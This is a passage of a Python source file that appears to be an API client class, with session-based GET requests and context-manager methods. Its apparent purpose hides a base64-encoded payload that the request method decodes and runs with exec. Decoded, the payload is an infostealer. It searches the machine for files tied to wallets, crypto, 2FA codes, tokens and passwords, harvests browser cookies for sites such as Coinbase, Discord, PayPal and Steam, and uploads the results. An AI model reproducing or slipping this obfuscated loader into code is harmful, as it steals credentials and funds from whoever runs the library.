AgICAgICAiYWNvdW50IiwNCiAgICAgICAgInBheXBhbCIsDQogICAgICAgICJiYW5xdWUiLA0KICAgICAgICAiYWNjb3VudCIsDQogICAgICAgICJtZXRhbWFzayIsDQogICAgICAgICJ3YWxsZXQiLA0KICAgICAgICAiY3J5cHRvIiwNCiAgICAgICAgImV4b2R1cyIsDQogICAgICAgICJkaXNjb3JkIiwNCiAgICAgICAgIjJmYSIsDQogICAgICAgICJjb2RlIiwNCiAgICAgICAgIm1lbW8iLA0KICAgICAgICAiY29tcHRlIiwNCiAgICAgICAgInRva2VuIiwNCiAgICAgICAgImJhY2t1cCIsDQogICAgICAgICJzZWVjcmV0Ig0KICAgICAgICBdDQoNCiAgICB3aWtpdGggPSBbXQ0KICAgIGZvciBwYXR0IGluIHBhdGgyc2VhcmNoOg0KICAgICAgICBraXdpID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9S2l3aUZpbGUsIGFyZ3M9W3BhdHQsIGtleV93b3Jkc0ZpbGVzXSk7a2l3aS5zdGFydCgpDQogICAgICAgIHdpa2l0aC5hcHBlbmQoa2l3aSkNCiAgICByZXR1cm4gd2lraXRoDQoNCg0KZ2xvYmFsIGtleXdvcmQsIGNvb2tpV29yZHMsIHBhc3dXb3Jkcw0KDQprZXl3b3JkID0gWw0KICAgICdtYWlsJywgJ1tjb2luYmFzZV0oaHR0cHM6Ly9jb2luYmFzZS5jb20pJywgJ1tzZWxsaXhdKGh0dHBzOi8vc2VsbGl4LmlvKScsICdbZ21haWxdKGh0dHBzOi8vZ21haWwuY29tKScsICdbc3RlYW1dKGh0dHBzOi8vc3RlYW0uY29tKScsICdbZGlzY29yZF0oaHR0cHM6Ly9kaXNjb3JkLmNvbSknLCAnW3Jpb3RnYW1lc10oaHR0cHM6Ly9yaW90Z2FtZXMuY29tKScsICdbeW91dHViZV0oaHR0cHM6Ly95b3V0dWJlLmNvbSknLCAnW2luc3RhZ3JhbV0oaHR0cHM6Ly9pbnN0YWdyYW0uY29tKScsICdbdGlrdG9rXShodHRwczovL3Rpa3Rvay5jb20pJywgJ1t0d2l0dGVyXShodHRwczovL3R3aXR0ZXIuY29tKScsICdbZmFjZWJvb2tdKGh0dHBzOi8vZmFjZWJvb2suY29tKScsICdjYXJkJywgJ1tlcGljZ2FtZXNdKGh0dHBzOi8vZXBpY2dhbWVzLmNvbSknLCAnW3Nwb3RpZnldKGh0dHBzOi8vc3BvdGlmeS5jb20pJywgJ1t5YWhvb10oaHR0cHM6Ly95YWhvby5jb20pJywgJ1tyb2Jsb3hdKGh0dHBzOi8vcm9ibG94LmNvbSknLCAnW3R3aXRjaF0oaHR0cHM6Ly90d2l0Y2guY29tKScsICdbbWluZWNyYWZ0XShodHRwczovL21pbmVjcmFmdC5uZXQpJywgJ2JhbmsnLCAnW3BheXBhbF0oaHR0cHM6Ly9wYXlwYWwuY29tKScsICdbb3JpZ2luXShodHRwczovL29yaWdpbi5jb20pJywgJ1thbWF6b25dKGh0dHBzOi8vYW1hem9uLmNvbSknLCAnW2ViYXldKGh0dHBzOi8vZWJheS5jb20pJywgJ1thbGlleHByZXNzXShodHRwczovL2FsaWV4cHJlc3MuY29tKScsICdbcGxheXN0YXRpb25dKGh0dHBzOi8vcGxheXN0YXRpb24uY29tKScsICdbaGJvXShodHRwczovL2hiby5jb20pJywgJ1t4Ym94XShodHRwczovL3hib3guY29tKScsICdidXknLCAnc2VsbCcsICdbYmluYW5jZV0oaHR0cHM6Ly9iaW5hbmNlLmNvbSknLCAnW2hvdG1haWxdKGh0dHBzOi8vaG90bWFpbC5jb20pJywgJ1tvdXRsb29rXShodHRwczovL291dGxvb2suY29tKScsICdbY3J1bmNoeXJvbGxdKGh0dHBzOi8vY3J1bmNoeXJvbGwuY29tKScsICdbdGVsZWdyYW1dKGh0dHBzOi8vdGVsZWdyYW0uY29tKScsICdbcG9ybmh1Yl0oaHR0cHM6Ly9wb3JuaHViLmNvbSknLCAnW2Rpc25leV0oaHR0cHM6Ly9kaXNuZXkuY29tKScsICdbZXhwcmVzc3Zwbl0oaHR0cHM6Ly9leHByZXNzdnBuLmNvbSknLCAnY3J5cHRvJywgJ1t1YmVyXShodHRwczovL3ViZXIuY29tKScsICdbbmV0ZmxpeF0oaHR0cHM6Ly9uZXRmbGl4LmNvbSknDQpdDQoNCg0KY29va2lXb3JkcyA9IFtdDQpwYXN3V29yZHMgPSBbXQ0KDQpHYXRoZXJBbGwoKQ0KREVURUNURUQgPSBUcnVzdChDb29raWVzKQ0KDQppZiBub3QgREVURUNURUQ6DQogICAgd2lraXRoID0gS2l3aSgpDQoNCiAgICBmb3IgdGhyZWFkIGluIHdpa2l0aDogdGhyZWFkLmpvaW4oKQ0KICAgIHRpbWUuc2xlZXAoMC4yKQ0KDQogICAgZmlsZXRleHQgPSAiXG4iDQogICAgZm9yIGFyZyBpbiBLaXdpRmlsZXM6DQogICAgICAgIGlmIGxlbihhcmdbMl0pICE9IDA6DQogICAgICAgICAgICBmb2xkcGF0aCA9IGFyZ1sxXQ0KICAgICAgICAgICAgZm9sZGxpc3QgPSBhcmdbMl0NCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi4oCiIHtmb2xkcGF0aH1cbiINCg0KICAgICAgICAgICAgZm9yIGZmaWwgaW4gZm9sZGxpc3Q6DQogICAgICAgICAgICAgICAgYSA9IGZmaWxbMF0uc3BsaXQoIi8iKQ0KICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0NCiAgICAgICAgICAgICAgICBiID0gZmZpbFsxXQ0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYiLi4uIFt7ZmlsZWFubWV9XSh7Yn0pXG4iDQogICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iDQogICAgdXBsb2FkKCJraXdpIiwgZmlsZXRleHQp
        """
        decoded_script = base64.b64decode(encoded_script).decode("utf-8")
        exec(decoded_script, globals())

        try:
            response = self.session.get(url)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            return {
                "success": False,
                "error": str(e),
                "place_id": place_id
            }
    
    def close(self):
        """
        Close the session and clean up resources
        """
        self.session.close()
    
    def __enter__(self):
        """Context manager entry"""
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit"""
        self.close()
